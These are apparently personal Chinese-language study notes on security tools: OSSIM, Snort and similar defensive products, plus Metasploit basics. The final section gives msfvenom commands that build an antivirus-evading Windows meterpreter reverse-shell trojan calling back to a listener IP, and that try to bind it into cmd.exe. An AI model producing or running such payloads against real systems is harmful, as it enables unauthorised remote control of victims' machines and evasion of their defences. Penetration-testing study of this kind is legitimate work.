# 生活技能

`后续补充`
snort , 
pfsense, 

#### ossim, 
```angular2html
OSSIM是SIEM的代表性产品，在产品形式上和Kali类似是一个基于Debain进行二次开发的Linux发行版，当前5.6.5版本基于Dibian 8（jessie）。

OSSIM使用Nmap等实现资产发现、使用Nessus等实现漏洞扫描、使用Snort等实现入侵检测、使用MySQL等进行数据存储，自己实现的部分主要是工具、数据整合和可视化展示。
```
### 下载地址
````angular2html
https://dlcdn.alienvault.com/AlienVault_OSSIM_64bits.iso
````
clamav, 
panabit, 
iscisi, 
freewaf, 
ningx


# Metasploit

### session
```angular2html
background 临时退出shell
```
### msfvenom

> 查看编辑器 `msfvenom --list encoders`
>
> 查看 `windows/meterpreter/reverse_tcp`支持的平台 `msfvenom -p windows/meterpreter/reverse_tcp --list-options`
>
> 查看所有payload `msfvenom --list payloads`
>
>还有 ` nops, platforms, archs, encrypt, formats`


#### msfvenom生成木马

```angular2html
生成免杀木马
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x00' lhost=10.2.7.130 lport=11206 -f exe > haya.exe

捆绑进cmd.exe，目前失败，程序无法执行
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=10.2.7.130 lport=11206 -b '\x00' -x cmd.exe -k -i 12 -f exe -o cmd1.exe
```

